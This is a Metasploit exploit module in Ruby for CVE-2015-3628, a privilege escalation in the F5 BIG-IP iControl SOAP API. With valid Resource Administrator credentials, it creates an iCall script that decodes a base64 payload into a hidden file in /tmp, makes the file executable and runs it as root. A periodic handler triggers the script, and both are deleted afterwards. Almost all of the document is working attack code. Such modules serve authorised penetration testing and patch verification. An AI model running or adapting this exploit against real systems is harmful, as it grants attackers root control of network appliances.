##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'nokogiri'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  SOAPENV_ENCODINGSTYLE = { "soapenv:encodingStyle" => "http://schemas.xmlsoap.org/soap/encoding/" }
  STRING_ATTRS = { 'xsi:type' => 'urn:Common.StringSequence', 'soapenc:arrayType' => 'xsd:string[]', 'xmlns:urn' => 'urn:iControl' }
  LONG_ATTRS = { 'xsi:type' => 'urn:Common.ULongSequence', 'soapenc:arrayType' => 'xsd:long[]', 'xmlns:urn' => 'urn:iControl' }

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "F5 iControl iCall::Script Root Command Execution",
        'Description'    => %q{
          This module exploits an authenticated privilege escalation
          vulnerability in the iControl API on the F5 BIG-IP LTM (and likely
          other F5 devices). This requires valid credentials and the Resource
          Administrator role. The exploit should work on BIG-IP 11.3.0
          - 11.6.0, (11.5.x < 11.5.3 HF2 or 11.6.x < 11.6.0 HF6, see references
          for more details)
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'tom', # Discovery, Metasploit module
            'Jon Hart <jon_hart[at]rapid7.com>' # Metasploit module
          ],
        'References'     =>
          [
            ['CVE', '2015-3628'],
            ['URL', 'https://support.f5.com/kb/en-us/solutions/public/16000/700/sol16728.html'],
            ['URL', 'https://gdssecurity.squarespace.com/labs/2015/9/8/f5-icallscript-privilege-escalation-cve-2015-3628.html']
          ],
        'Platform'       => ['unix'],
        'Arch'           => ARCH_CMD,
        'Targets'        =>
          [
            ['F5 BIG-IP LTM 11.x', {}]
          ],
        'Privileged'     => true,
        'DisclosureDate' => "Sep 3 2015",
        'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TARGETURI', [true, 'The base path to the iControl installation', '/iControl/iControlPortal.cgi']),
        OptString.new('USERNAME', [true, 'The username to authenticate with', 'admin']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin'])
      ])
    register_advanced_options(
      [
        OptInt.new('SESSION_WAIT', [ true, 'The max time to wait for a session, in seconds', 5 ]),
        OptString.new('PATH', [true, 'Filesystem path for the dropped payload', '/tmp']),
        OptString.new('FILENAME', [false, 'File name of the dropped payload, defaults to random']),
        OptInt.new('ARG_MAX', [true, 'Command line length limit', 131072])
      ])
  end

  def setup
    file = datastore['FILENAME']
    file ||= ".#{Rex::Text.rand_text_alphanumeric(16)}"
    @payload_path = ::File.join(datastore['PATH'], file)
    super
  end

  def build_xml
    builder = Nokogiri::XML::Builder.new do |xml|
      xml.Envelope do
        xml = xml_add_namespaces(xml)
        xml['soapenv'].Header
        xml['soapenv'].Body do
          yield xml
        end
      end
    end
    builder.to_xml
  end

  def xml_add_namespaces(xml)
    ns = xml.doc.root.add_namespace_definition("soapenv", "http://schemas.xmlsoap.org/soap/envelope/")
    xml.doc.root.namespace = ns
    xml.doc.root.add_namespace_definition("xsi", "http://www.w3.org/2001/XMLSchema-instance")
    xml.doc.root.add_namespace_definition("xsd", "http://www.w3.org/2001/XMLSchema")
    xml.doc.root.add_namespace_definition("scr", "urn:iControl:iCall/Script")
    xml.doc.root.add_namespace_definition("soapenc", "http://schemas.xmlsoap.org/soap/encoding")
    xml.doc.root.add_namespace_definition("per", "urn:iControl:iCall/PeriodicHandler")
    xml
  end

  def send_soap_request(pay)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'data' => pay,
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD']
    )
    if res
      return res
    else
      vprint_error('No response')
    end
    false
  end

  def create_script(name, cmd)
    create_xml = build_xml do |xml|
      xml['scr'].create(SOAPENV_ENCODINGSTYLE) do
        xml.scripts(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item name
        end
        xml.definitions(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item cmd
        end
      end
    end
    send_soap_request(create_xml)
  end

  def delete_script(script_name)
    delete_xml = build_xml do |xml|
      xml['scr'].delete_script(SOAPENV_ENCODINGSTYLE) do
        xml.scripts(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item script_name
        end
      end
    end
    print_error("Error while cleaning up script #{script_name}") unless (res = send_soap_request(delete_xml))
    res
  end

  def script_exists?(script_name)
    exists_xml = build_xml do |xml|
      xml['scr'].get_list(SOAPENV_ENCODINGSTYLE)
    end
    res = send_soap_request(exists_xml)
    res && res.code == 200 && res.body =~ Regexp.new("/Common/#{script_name}")
  end

  def create_handler(handler_name, script_name)
    print_status("Creating trigger #{handler_name}")
    handler_xml = build_xml do |xml|
      xml['per'].create(SOAPENV_ENCODINGSTYLE) do
        xml.handlers(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item handler_name
        end
        xml.scripts(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item script_name
        end
        xml.intervals(LONG_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          # we set this to run once every 24h, but because there is no
          # start/end time it will run once, more or less immediately, and
          # again 24h from now, but by that point hopefully we will have
          # cleaned up and the handler/script/etc are gone
          xml.item 60 * 60 * 24
        end
      end
    end
    res = send_soap_request(handler_xml)
    if res
      if res.code == 200 && res.body =~ Regexp.new("iCall/PeriodicHandler")
        true
      else
        print_error("Trigger creation failed -- HTTP/#{res.proto} #{res.code} #{res.message}")
        false
      end
    else
      print_error("No response to trigger creation")
      false
    end
  end

  def delete_handler(handler_name)
    delete_xml = build_xml do |xml|
      xml['per'].delete_handler(SOAPENV_ENCODINGSTYLE) do
        xml.handlers(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item handler_name
        end
      end
    end

    print_error("Error while cleaning up handler #{handler_name}") unless (res = send_soap_request(delete_xml))
    res
  end

  def handler_exists?(handler_name)
    handler_xml = build_xml do |xml|
      xml['per'].get_list(SOAPENV_ENCODINGSTYLE)
    end
    res = send_soap_request(handler_xml)
    res && res.code == 200 && res.body =~ Regexp.new("/Common/#{handler_name}")
  end

  def check
    # strategy: we'll send a create_script request, with empty name:
    # if everything is ok, the server return a 500 error saying it doesn't like empty names
    # XXX ignored at the moment: if the user doesn't have enough privileges, 500 error also is returned, but saying 'access denied'.
    # if the user/password is wrong, a 401 error is returned, the server might or might not be vulnerable
    # any other response is considered not vulnerable
    res = create_script('', '')
    if res && res.code == 500 && res.body =~ /path is empty/
      return Exploit::CheckCode::Appears
    elsif res && res.code == 401
      print_warning("HTTP/#{res.proto} #{res.code} #{res.message} -- incorrect USERNAME or PASSWORD?")
      return Exploit::CheckCode::Unknown
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    # phase 1: create iCall script to create file with payload, execute it and remove it.
    shell_cmd = %(echo #{Rex::Text.encode_base64(payload.encoded)}|base64 --decode >#{@payload_path}; chmod +x #{@payload_path};#{@payload_path})
    cmd = %(exec /bin/sh -c "#{shell_cmd}")

    arg_max = datastore['ARG_MAX']
    if shell_cmd.size > arg_max
      print_error "Payload #{datastore['PAYLOAD']} is too big, try a different payload "\
        "or increasing ARG_MAX (note that payloads bigger than the target's configured ARG_MAX value may fail to execute)"
      return false
    end

    script_name = "script-#{Rex::Text.rand_text_alphanumeric(16)}"
    print_status("Uploading payload script #{script_name}")
    unless (create_script_res = create_script(script_name, cmd))
      print_error("No response when uploading payload script")
      return false
    end
    unless create_script_res.code == 200
      print_error("Upload payload script failed -- HTTP/#{create_script_res.proto} "\
                  "#{create_script_res.code} #{create_script_res.message}")
      return false
    end
    unless script_exists?(script_name)
      print_error("Payload script uploaded successfully but script was not found")
      return false
    end
    register_file_for_cleanup @payload_path

    # phase 2: create iCall Handler, that will actually run the previously created script
    handler_name = "handler-#{Rex::Text.rand_text_alphanumeric(16)}"
    unless create_handler(handler_name, script_name)
      delete_script(script_name)
      return false
    end
    unless handler_exists?(handler_name)
      print_error("Trigger created successfully but was not found")
      delete_script(script_name)
      return false
    end
    print_status('Waiting for payload to execute...')

    # if our payload has not been successfully executed just yet, wait
    # until it does or give up
    slept = 0
    until session_created? || slept > datastore['SESSION_WAIT']
      Rex.sleep(1)
      slept += 1
    end

    print_status('Trying cleanup...')
    delete_script(script_name)
    delete_handler(handler_name)
  end
end